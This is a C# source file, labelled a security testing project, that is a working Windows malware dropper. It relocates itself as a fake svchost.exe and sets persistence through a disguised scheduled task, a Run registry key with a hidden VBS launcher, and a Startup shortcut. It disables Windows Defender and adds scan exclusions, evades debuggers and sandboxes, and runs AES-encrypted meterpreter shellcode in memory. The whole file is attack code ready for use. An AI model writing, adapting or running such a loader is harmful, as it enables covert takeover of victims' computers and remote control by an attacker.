using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Security.Cryptography;
using System.Threading;
using System.Reflection;

namespace SecurityTestingProject
{
    internal class Program
    {
        // Windows API imports for memory allocation and execution
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        // Constants for memory allocation
        private const uint MEM_COMMIT = 0x1000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint PAGE_READWRITE = 0x04;

        static void Main(string[] args)
        {
            // Check if this is a relocated instance
            bool isPayloadInstance = CheckForPayloadArg(args);
            string currentFilePath = Process.GetCurrentProcess().MainModule.FileName;
            string destPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                @"Microsoft\Windows\svchost.exe"
            );

            // If this is the relocated instance or we're already at the destination path, run the payload
            if (isPayloadInstance || currentFilePath.Equals(destPath, StringComparison.OrdinalIgnoreCase))
            {
                // Add a short delay to avoid any sandboxing checks based on immediate execution
                Thread.Sleep(1000);

                // Attempt to disable Windows Defender silently
                TryDisableDefender();

                // Run the in-memory shellcode payload
                ExecuteShellcodeInMemory();
                return;
            }

            // If this is the initial run, handle relocation
            try
            {
                // Create directory if needed
                if (!Directory.Exists(Path.GetDirectoryName(destPath)))
                {
                    Directory.CreateDirectory(Path.GetDirectoryName(destPath));
                }

                // Copy file to destination if not already there
                if (!File.Exists(destPath))
                {
                    File.Copy(currentFilePath, destPath, true);
                }

                // Try to use scheduled task for persistence (requires admin)
                bool scheduled = TryCreateScheduledTask(destPath);

                if (!scheduled)
                {
                    // Fallback to registry persistence if scheduled task fails
                    SetRegistryPersistence(destPath);
                }

                // Launch the relocated payload with special argument
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = destPath,
                    Arguments = "--payload",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                Process.Start(startInfo);

                // Immediately exit the initial process after relocation and persistence setup
                return;
            }
            catch
            {
                // If relocation fails, just run the payload
                ExecuteShellcodeInMemory();
                // Immediately exit in case of failure as well
                return;
            }
        }

        static bool CheckForPayloadArg(string[] args)
        {
            // Check if this instance was launched with the payload argument
            return args.Length > 0 && args[0] == "--payload";
        }

        static bool TryCreateScheduledTask(string filePath)
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = "schtasks",
                    Arguments = $@"/create /sc onlogon /tn ""WindowsUpdateChecker"" /tr \""{filePath} --payload\"" /rl HIGHEST /f",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };
                var process = Process.Start(psi);
                process.WaitForExit();
                return process.ExitCode == 0;
            }
            catch
            {
                return false;
            }
        }

        static void SetRegistryPersistence(string filePath)
{
    try
    {
        using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(
            @"Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
        {
            if (rk != null)
            {
                // Create a VBS script that will launch the process hidden
                string vbsPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    @"Microsoft\Windows\launcher.vbs");
                
                // Create a VBS launcher that runs the executable silently
                using (StreamWriter sw = new StreamWriter(vbsPath))
                {
                    sw.WriteLine("Set WshShell = CreateObject(\"WScript.Shell\")");
                    sw.WriteLine($"WshShell.Run Chr(34) & \"{filePath}\" & Chr(34) & \" --payload\", 0, False");
                    sw.WriteLine("Set WshShell = Nothing");
                }
                
                // Use wscript to run the VBS silently
                rk.SetValue("WindowsUpdateChecker", $"wscript.exe //nologo \"{vbsPath}\"");
            }
        }

        // Also try to add a startup folder shortcut as an alternative method
        try
        {
            string startupFolder = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                "WindowsUpdate.lnk");

            // Use VBS to create a proper Windows shortcut with hidden property
            string vbsShortcutPath = Path.GetTempFileName() + ".vbs";
            using (StreamWriter sw = new StreamWriter(vbsShortcutPath))
            {
                sw.WriteLine("Set WshShell = WScript.CreateObject(\"WScript.Shell\")");
                sw.WriteLine($"Set shortcut = WshShell.CreateShortcut(\"{startupFolder}\")");
                sw.WriteLine($"shortcut.TargetPath = \"{filePath}\"");
                sw.WriteLine("shortcut.Arguments = \"--payload\"");
                sw.WriteLine("shortcut.WindowStyle = 7");  // 7 = minimized and hidden
                sw.WriteLine("shortcut.Save");
            }

            // Execute the VBS script to create the shortcut
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "wscript.exe",
                    Arguments = $"//nologo \"{vbsShortcutPath}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };
            proc.Start();
            proc.WaitForExit();

            // Clean up the temp VBS file
            try { File.Delete(vbsShortcutPath); } catch { }
        }
        catch
        {
            // Silent fail for startup folder
        }
    }
    catch
    {
        // Silent error handling
    }
}

        private static bool IsProcessBeingDebugged()
        {
            return Debugger.IsAttached;
        }

        private static void TryDisableDefender()
        {
            try
            {
                // Method 1: Using PowerShell to disable real-time monitoring (quieter approach)
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = "-WindowStyle Hidden -Command Set-MpPreference -DisableRealtimeMonitoring $true -Force",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                using (Process proc = Process.Start(psi))
                {
                    proc?.WaitForExit(3000); // Wait max 3 seconds
                }

                // Method 2: Registry approach (for more persistence)
                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\\Policies\\Microsoft\\Windows Defender"))
                {
                    key?.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
                }

                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"))
                {
                    key?.SetValue("DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
                    key?.SetValue("DisableBehaviorMonitoring", 1, RegistryValueKind.DWord);
                    key?.SetValue("DisableScanOnRealtimeEnable", 1, RegistryValueKind.DWord);
                }

                // Method 3: Try to exclude our path from scanning
                string currentExePath = Process.GetCurrentProcess().MainModule.FileName;
                string folderPath = Path.GetDirectoryName(currentExePath);

                ProcessStartInfo psi2 = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-WindowStyle Hidden -Command Add-MpPreference -ExclusionPath '{folderPath}' -Force",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                using (Process proc = Process.Start(psi2))
                {
                    proc?.WaitForExit(3000); // Wait max 3 seconds
                }
            }
            catch
            {
                // Silent failure - don't expose errors
            }
        }

        public static void ExecuteShellcodeInMemory()
        {
            try
            {
                // Your AES encrypted meterpreter shellcode generated from:
                byte[] encryptedShellcode = new byte[] {
                    0x6c, 0x9e, 0x4e, 0xaa, 0xe8, 0xec, 0xe5, 0xa4, 0x98, 0x73, 0xd2, 0xe7, 0xe9, 0xb2, 0x63, 0xa9,
                    0x57, 0x38, 0x63, 0x03, 0x85, 0xa9, 0xd4, 0xc2, 0xc3, 0x9c, 0x65, 0x0d, 0x21, 0x4d, 0xa7, 0x7a,
                    0xa2, 0x93, 0x77, 0x04, 0x96, 0x32, 0x0c, 0xf7, 0x4a, 0x48, 0x39, 0x03, 0x22, 0x90, 0x81, 0x51,
                    0xd2, 0xbd, 0x96, 0x35, 0x2a, 0x6e, 0xa7, 0xed, 0x8d, 0x3b, 0x05, 0x20, 0x80, 0x68, 0x71, 0x05,
                    0xdd, 0xce, 0x10, 0xd3, 0xad, 0x30, 0x1d, 0x9d, 0x5b, 0x77, 0x61, 0x6d, 0xee, 0x70, 0xda, 0x43,
                    0x1e, 0x90, 0x64, 0xe7, 0xb9, 0x47, 0xa5, 0x86, 0x42, 0x04, 0x21, 0x89, 0x81, 0x7b, 0x96, 0x74,
                    0x46, 0x7a, 0x15, 0x80, 0xc8, 0x74, 0x18, 0x2a, 0xfc, 0xe5, 0x6d, 0x04, 0x26, 0xe6, 0x18, 0x05,
                    0xc4, 0x1b, 0xcd, 0xa1, 0x69, 0x5f, 0x09, 0x0a, 0x20, 0xe5, 0x5b, 0x7f, 0xba, 0x49, 0xbf, 0xf1,
                    0x57, 0xe9, 0x00, 0xd2, 0xae, 0x55, 0xb3, 0x59, 0x37, 0x2a, 0xf1, 0x09, 0x2f, 0xbd, 0x15, 0x88,
                    0xf0, 0xae, 0xd6, 0x3a, 0x17, 0xaa, 0x36, 0xe2, 0xfd, 0x0d, 0xb2, 0xeb, 0x8f, 0x80, 0x96, 0x76,
                    0xe7, 0xdf, 0xb6, 0x86, 0x6a, 0x95, 0x0d, 0x63, 0x54, 0xc0, 0x9d, 0xb3, 0x54, 0xae, 0x7e, 0x0a,
                    0xbd, 0xe4, 0x5e, 0x82, 0x22, 0x7f, 0x77, 0x55, 0xb3, 0xa5, 0xd3, 0xd1, 0x4a, 0xc9, 0xd8, 0x8c,
                    0xf3, 0x3e, 0xd0, 0xb0, 0x87, 0x50, 0x49, 0xca, 0xe8, 0xbe, 0x55, 0xfb, 0x25, 0x16, 0x96, 0x53,
                    0x91, 0x7b, 0x00, 0x33, 0xd7, 0xf7, 0xde, 0x53, 0xad, 0x0e, 0xec, 0x0f, 0x4d, 0x70, 0x2a, 0x8a,
                    0x24, 0xe7, 0xcc, 0x20, 0xf2, 0x7e, 0x59, 0x07, 0x91, 0x29, 0xb3, 0x9e, 0x56, 0xc8, 0xc9, 0x75,
                    0x4d, 0xf5, 0x20, 0x12, 0xa7, 0xcc, 0x55, 0xd1, 0x87, 0x68, 0xef, 0x4c, 0xc5, 0xfb, 0xcf, 0xc9,
                    0x1d, 0xab, 0x56, 0x8f, 0x8d, 0xa0, 0xce, 0xe5, 0x83, 0x5a, 0x4b, 0x46, 0xd9, 0x10, 0x6a, 0x8a,
                    0x42, 0xe9, 0x85, 0x57, 0xba, 0xdd, 0xb7, 0xb0, 0x1b, 0x03, 0xf0, 0xfb, 0x9b, 0x98, 0x79, 0x28,
                    0xe3, 0x98, 0xfe, 0xff, 0xd4, 0x6b, 0x2d, 0x51, 0x0c, 0xe2, 0x77, 0x15, 0x4c, 0x73, 0x5d, 0x1c,
                    0x83, 0xf2, 0x9e, 0x3d, 0x2b, 0xf6, 0x8f, 0x5e, 0x2b, 0xc3, 0x03, 0xbc, 0x2b, 0xb6, 0x72, 0xf2,
                    0xa9, 0x30, 0x08, 0x13, 0x72, 0xed, 0x87, 0x5c, 0x0e, 0x6c, 0x41, 0xd2, 0xf9, 0xcb, 0x4e, 0x86,
                    0x55, 0x63, 0x59, 0xe7, 0x73, 0x67, 0xff, 0x94, 0x87, 0xe0, 0xd7, 0xe9, 0xad, 0x67, 0xe2, 0x75,
                    0x60, 0x6b, 0xb1, 0x0b, 0xbe, 0xd6, 0x7e, 0x5f, 0x07, 0x23, 0x47, 0xe7, 0x6d, 0xb7, 0x07, 0x10,
                    0xab, 0x6f, 0xbd, 0xfb, 0xc8, 0xfe, 0xf6, 0x61, 0x09, 0xbb, 0xd4, 0x54, 0x16, 0x17, 0xcb, 0xd5,
                    0xd5, 0xce, 0x47, 0xb0, 0x90, 0x88, 0x12, 0x50, 0x97, 0x82, 0x94, 0x14, 0x3e, 0xde, 0x91, 0x33,
                    0x7e, 0x60, 0xc4, 0xcd, 0x3f, 0xbf, 0x24, 0x2a, 0x62, 0xb0, 0x8a, 0x48, 0xb2, 0x7a, 0x23, 0x53,
                    0x51, 0x72, 0x2d, 0x76, 0xc7, 0x58, 0xba, 0x30, 0x9c, 0x30, 0xf6, 0xbe, 0xb2, 0x14, 0x50, 0x4f,
                    0xc7, 0xa3, 0xd5, 0xc6, 0xa4, 0xff, 0x25, 0x7a, 0xb6, 0x59, 0x64, 0x72, 0x4e, 0xfc, 0xe9, 0xd2,
                    0x60, 0x07, 0x94, 0xae, 0x4c, 0xcc, 0x5a, 0xa1, 0x1e, 0xc1, 0x0d, 0xb0, 0xd1, 0xfd, 0xb3, 0xba,
                    0xc1, 0x72, 0xf6, 0xdd, 0x67, 0x13, 0x68, 0x0e, 0xb7, 0xe9, 0x7b, 0x8c, 0x7d, 0x4b, 0x1b, 0x80,
                    0x64, 0x95, 0x3c, 0x09, 0x84, 0x41, 0x16, 0xaa, 0x7d, 0x2c, 0xa3, 0x45, 0x30, 0x01, 0x1e, 0x38,
                    0x46, 0x12, 0xc9, 0xbe, 0xfb, 0x92, 0xa1, 0x25, 0xbd, 0xe8, 0xd8, 0x67, 0xf8, 0xdd, 0xfa, 0x7d
                };

                // Your AES key and IV (keep these the same as what you used for encryption)
                byte[] aesKey = new byte[] {
                    0x0b, 0x8f, 0x4e, 0x96, 0x4b, 0x35, 0x7d, 0xfc, 0x35, 0x44, 0x68, 0x75, 0xa0, 0x8e, 0x5a, 0x16,
                    0x85, 0x53, 0xa2, 0xa1, 0x36, 0x5f, 0x9c, 0xfc, 0x7a, 0x7b, 0x0b, 0x75, 0x68, 0x77, 0x8e, 0xa0
                };
                byte[] aesIV = new byte[] {
                    0x47, 0x33, 0x1e, 0x8a, 0xfa, 0xd7, 0xdd, 0x93, 0x68, 0x0f, 0x17, 0xa7, 0x51, 0xa2, 0x4a, 0x78
                };

                // Add some evasion techniques
                if (IsProcessBeingDebugged())
                {
                    return; // Exit if being debugged
                }

                // Decrypt the shellcode
                byte[] shellcode = AESDecrypt(encryptedShellcode, aesKey, aesIV);

                // Execute shellcode directly in current process (stealthier than injection)
                ExecuteShellcode(shellcode);
            }
            catch
            {
                // Silent failure - to avoid exposing errors to any monitoring
            }
        }

        private static byte[] AESDecrypt(byte[] encryptedData, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (var decryptor = aes.CreateDecryptor())
                {
                    return decryptor.TransformFinalBlock(encryptedData, 0, encryptedData.Length);
                }
            }
        }

        private static void ExecuteShellcode(byte[] shellcode)
        {
            // Allocate memory for the shellcode with read/write access
            IntPtr baseAddress = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_READWRITE);

            if (baseAddress == IntPtr.Zero)
            {
                return;
            }

            // Copy shellcode to allocated memory
            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            // Change memory protection to allow execution
            uint oldProtect;
            if (!VirtualProtect(baseAddress, (UIntPtr)shellcode.Length, PAGE_EXECUTE_READWRITE, out oldProtect))
            {
                return;
            }

            // Create a thread to execute the shellcode
            IntPtr threadId;
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, out threadId);

            if (hThread == IntPtr.Zero)
            {
                return;
            }

            // Wait for the thread to complete (optional)
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    }
}
